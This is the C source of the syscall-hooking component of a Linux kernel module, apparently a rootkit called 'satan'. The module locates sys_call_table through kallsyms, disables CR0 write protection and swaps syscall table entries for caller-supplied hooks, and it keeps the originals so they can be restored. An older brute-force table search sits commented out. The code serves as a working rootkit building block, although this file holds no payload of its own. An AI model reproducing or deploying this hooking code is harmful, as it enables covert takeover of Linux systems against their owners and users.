// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "syscall.h"

#include <linux/kallsyms.h>
#include <linux/module.h>

#include "util.h"


#define BRUTEFORCE_ADDR_BEGIN 0xd0000000
#define BRUTEFORCE_ADDR_END 0xe0000000
#define SYS_CALL_ID_SIZE 512

static bool has_found_table = false;
static bool is_hooked[SYS_CALL_ID_SIZE] = { false };

static unsigned long *original[SYS_CALL_ID_SIZE] = { NULL };
static unsigned long **table = NULL;

static int satan_syscall_find_table(void);


/**
 * satan_syscall_init() - Initializes satan's syscall module.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_syscall_init(void)
{
        return satan_syscall_find_table();
}

int satan_syscall_exit(void)
{
        return 0;
}

/**
 * satan_syscall_find_table() - Attempts to find sys_call_table.
 *
 * Return: zero on success and non-zero otherwise.
 */
static int satan_syscall_find_table(void)
{
	/*
        unsigned long *real_sys_read = NULL;
        unsigned long ptr = 0;

        real_sys_read = (void *) kallsyms_lookup_name("__x64_sys_exit");
        pr_info("satan: syscall: found ksys_read via kallsyms: %p\n", real_sys_read);

        if (!real_sys_read) {
          return 1;
        }

        for (ptr = BRUTEFORCE_ADDR_BEGIN; ptr <= BRUTEFORCE_ADDR_END; ptr++) {
                table = (unsigned long **) ptr;

                if (table[__NR_exit] == (unsigned long *) real_sys_read) {
                        pr_info("satan: found sys_call_table: %p\n", table);
                        has_found_table = true;
                        return 0;
                }
        }

        pr_err("satan: unable to find sys_call_table!!!\n");
        table = NULL;
        return 1;
	*/

	table = (void *) kallsyms_lookup_name("sys_call_table");
        pr_info("satan: syscall: found table via kallsyms: %p\n", table);
	has_found_table = true;
	return 0;
}

/**
 * satan_syscall_hook() - Replaces a syscall with your own.
 * @id: __NR_sysxxx
 * @hook: user's syscall
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_syscall_hook(int id, void *hook)
{
        if (!has_found_table) {
                pr_err("satan: syscall: table not found yet.\n");
                return 1;
        }

        if (id >= SYS_CALL_ID_SIZE) {
                pr_err("satan: syscall: id too large.\n");
                return 2;
        }

        if (is_hooked[id]) {
                pr_err("satan: syscall: %d is already hooked.\n", id);
                return 3;
        }


        pr_info("satan: syscall: hooked %d (%p -> %p)\n", id, table[id], hook);

        CR0_WP_DISABLE {
                original[id] = (void *) table[id];
                table[id] = (unsigned long *) hook;
        } CR0_WP_DISABLE_END

        is_hooked[id] = true;
        return 0;
}

/**
 * satan_syscall_unhook() - Restores a syscall to its original one.
 * @id: __NR_sysxxx
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_syscall_unhook(int id)
{
        if (!has_found_table) {
                pr_err("satan: syscall: table not found yet.\n");
                return 1;
        }

        if (id >= SYS_CALL_ID_SIZE) {
                pr_err("satan: syscall: id too large.\n");
                return 2;
        }

        if (!is_hooked[id]) {
                pr_err("satan: syscall: %d has not been hooked yet.\n", id);
                return 3;
        }


        pr_info("satan: syscall: restored %d (%p -> %p)\n", id, table[id], original[id]);

        CR0_WP_DISABLE {
                table[id] = (unsigned long *) original[id];
                original[id] = NULL;
        } CR0_WP_DISABLE_END

        is_hooked[id] = false;
        return 0;
}

/**
 * satan_syscall_get_original() - Gets the address of an original syscall function.
 * @id: __NR_sysxxx
 *
 * Return: the address of an original syscall function.
 */
unsigned long *satan_syscall_get_original(int id)
{
        return original[id];
}
